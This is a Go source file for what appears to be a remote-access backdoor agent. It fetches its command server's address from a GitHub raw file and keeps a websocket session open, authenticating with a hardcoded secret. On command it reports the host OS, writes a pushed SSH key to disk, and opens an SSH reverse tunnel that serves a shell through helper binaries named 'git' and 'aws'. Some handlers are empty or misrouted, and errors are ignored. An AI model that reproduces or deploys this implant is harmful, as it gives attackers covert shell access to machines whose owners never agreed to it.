package main

import (
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	"golang.org/x/net/websocket"
)

const secret = "EnCryp!e0?"

type Agent struct {
	serverIp   string
	serverPort string
	isAuth     bool
	id         string
	secret     string
	name       string
	ws         *websocket.Conn
}
type Payload struct {
	mode    string
	args    []string
	length  int
	content string
	from    string
	status  string
}

func NewAgent() *Agent {
	serverInfo := getServerInfo()
	info := strings.Split(serverInfo, " ")
	return &Agent{
		serverIp:   info[0],
		serverPort: info[1],
		isAuth:     false,
		id:         "",
		secret:     secret,
		name:       "agent-" + RandomString(5),
	}
}

func getServerInfo() string {
	resp, err := http.Get("https://raw.githubusercontent.com/devoxit/static/main/test.txt")
	if err != nil {
		// handle error
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	fmt.Println(string(body))
	return strings.Trim(string(body), "\n")
}

func NewPayload() *Payload {
	return &Payload{
		mode:    "",
		args:    []string{},
		length:  0,
		content: "",
		from:    "server",
		status:  "",
	}
}
func (a *Agent) connect(url string, origin string) {

	ws, err := websocket.Dial(url, "", origin)
	if err != nil {
		failCount := 1
		log.Println("Connection failed, re-trying ...", failCount)
		for {
			ws, err = websocket.Dial(url, "", origin)
			if err != nil {
				failCount++
				time.Sleep(5 * time.Second)
				continue
			} else {
				break
			}
		}
	}
	a.ws = ws
	log.Printf("Connected to %s", url)
	if a.isAuth != true {
		a.authReq()
	}

	a.listenLoop()
}

func (a *Agent) listenLoop() {
	var buf = make([]byte, 1024)
	for {
		n, err := a.ws.Read(buf)

		if err != nil {
			log.Println("Error reading", err)
		}
		msg := buf[:n]

		a.msgHandler(string(msg))

		time.Sleep(1 * time.Second)
	}
}

func (a *Agent) msgHandler(msg string) {
	fmt.Println(string(msg))
	payload := NewPayload()
	payload.parser(msg)
	fmt.Println(*payload)
	if a.isAuth != true && payload.mode != "authResponse" {
		a.authReq()
	}
	switch payload.mode {
	case "cmd":
		a.handleCmd(payload)
		break
	case "authResponse":
		a.handleAuthRes(payload)
		break
	case "msg":
		a.handleMsg(payload)
		break
	case "ping":
		a.handlePing(payload)
		break
	case "os":
		a.handleOs(payload)
		break
	case "rs":
		a.handleRs(payload)
		break
	case "sshKey":
		a.handleRs(payload)
		break
	}

}

func (a *Agent) authReq() {
	authCmd := "/auth:" + a.name + "@" + a.secret
	send(authCmd, a.ws)
}

func (a *Agent) handleAuthRes(payload *Payload) {
	if payload.mode != "authResponse" {
		return
	}
	switch payload.status {
	case "E001":
		fmt.Println("Retrying ...")
		time.Sleep(3 * time.Second)
		a.authReq()
	case "E403":
		a.authReq()
	case "S001":
		data := strings.Split(payload.content, "/")
		a.isAuth = true
		a.id = data[0]
	}
}

func (a *Agent) handlePing(payload *Payload) {
	if payload.mode != "ping" {
		return
	}
	send("/pong:"+payload.from, a.ws)
}

func (a *Agent) handleCmd(payload *Payload) {
	if payload.mode != "cmd" {
		return
	}

}

func (a *Agent) handleMsg(payload *Payload) {
	if payload.mode != "msg" {
		return
	}
	send("/msg: well recived -> "+payload.from, a.ws)
}

func (a *Agent) handleOs(payload *Payload) {
	if payload.mode != "os" {
		return
	}
	fmt.Println(runtime.GOOS)
	send("/msg: "+runtime.GOOS+" -> "+payload.from, a.ws)
}

func (a *Agent) handleRs(payload *Payload) {
	if payload.mode != "rs" {
		return
	}
	args := strings.Split(payload.content, " ")
	shell := args[0]
	params := args[1:len(args)]
	fmt.Print("----------", params)
	intport := strconv.Itoa(9600 + rand.Intn(100))
	command := "0 -NL " + intport + ":" + params[0] + ":" + params[1] + " " + params[2] + "@" + params[3] + " -i ./key.pem"
	fmt.Println("---------------", shell, params)
	go connectToRs(command, shell, intport)
	send("/msg: Shell served successfully on "+runtime.GOOS+" -> "+payload.from, a.ws)
}

func (a *Agent) handleSshKey(payload *Payload) {
	if payload.mode != "sshKey" {
		return
	}
	// create the file
	f, err := os.Create("test.txt")
	if err != nil {
		send("failed to create the ssh key file", a.ws)
	}
	defer f.Close()

	fmt.Println(payload.content)
	f.WriteString(payload.content)
	// close the file with defer

	send("/msg: Shell served successfully on "+runtime.GOOS+" -> "+payload.from, a.ws)
}

func main() {
	agent := NewAgent()
	origin := "http://" + agent.serverIp
	url := "ws://" + agent.serverIp + ":" + agent.serverPort + "/ws"
	fmt.Println(url, origin)
	agent.connect(url, origin)
}

func send(str string, ws *websocket.Conn) bool {
	_, err := ws.Write([]byte(str))
	if err != nil {
		fmt.Println("Error: ", err)
		return false
	}
	return true
}

func RandomString(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

	s := make([]rune, n)
	for i := range s {
		s[i] = letters[rand.Intn(len(letters))]
	}
	return string(s)
}

func (p *Payload) parser(str string) {
	args := strings.Split(str, " -> ")
	switch args[0] {
	case "[cmd]":
		p.mode = "cmd"
		p.cmdParser(args[1])
		break
	case "[auth]":
		p.mode = "authResponse"
		p.authResParser(args[1])
		break
	case "[ping]":
		p.mode = "ping"
		p.pingParser(args[1])
		break
	case "[os]":
		p.mode = "os"
		p.osParser(args[1])
		break
	case "[rs]":
		p.mode = "rs"
		p.rsParser(args[1])
		break
	case "[sshKey]":
		p.mode = "sshKey"
		p.rsParser(args[1])
		break
		// default:
		// 	p.mode = "msg"
		// 	p.msgParser(str)
	}
}

func (p *Payload) cmdParser(str string) {
	args := strings.Split(str, " <- ")
	p.args = args
	p.content = args[0]
	p.from = args[1]
	p.length = len(args)
}

func (p *Payload) authResParser(str string) {
	args := strings.Split(str, ": ")
	p.args = args
	p.status = args[0]
	p.content = args[1]
	p.length = len(args)
}

func (p *Payload) pingParser(str string) {
	p.from = str
	p.length = 1

}

func (p *Payload) msgParser(str string) {
	args := strings.Split(str, " <- ")
	p.args = args
	p.length = len(args)
	p.content = args[0]
	p.from = "*"
	if len(args) > 1 {
		p.from = args[1]
	}
}

func (p *Payload) osParser(str string) {
	p.from = str
	p.length = 1
}

func (p *Payload) rsParser(str string) {
	args := strings.Split(str, " <- ")
	p.args = args
	p.length = len(args)
	p.content = args[0]
	p.from = args[1]
}

func (p *Payload) sshKeyParser(str string) {
	p.args = []string{str}
	p.length = 1
	p.content = str
	p.from = "server"
}

func connectToRs(params string, shell string, intport string) bool {
	//create ssh tunnel
	go createTunnel(params)
	//sleep 5s
	time.Sleep(time.Millisecond * 5000)
	// find shell type
	//spin the shell executor
	fmt.Println("executor------->>", intport, shell)
	_shell := exec.Command("./aws"+extension(), "localhost", intport, shell)
	err := _shell.Run()
	if err != nil {
		return true
	}
	return false
}

func createTunnel(command string) {
	fmt.Println("creating tunnel ... !", command)
	args := strings.Split(command, " ")
	_tunnel := exec.Command("./git"+extension(), args...)
	err := _tunnel.Run()
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println("tunnel created !")
	}
}

func extension() string {
	os := runtime.GOOS
	if os == "windows" {
		return ".exe"
	}

	if os == "linux" {
		return ".sh"
	}
	return ""
}
